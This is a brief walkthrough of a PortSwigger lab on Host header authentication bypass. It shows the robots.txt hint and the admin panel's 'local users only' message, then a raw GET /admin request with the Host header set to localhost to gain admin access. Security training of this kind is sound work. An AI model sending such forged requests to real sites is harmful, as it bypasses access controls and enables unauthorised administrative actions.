# [Lab: Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

## Lab

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete Carlos's account.

## Analysis

robots.txt:

```text
User-agent: *
Disallow: /admin
```

GET /admin:

```text
Admin interface only available to local users
```

## Solutions

change `Host` header to localhost:

```http
GET /admin HTTP/1.1
Host: localhost
```

=> bypassed
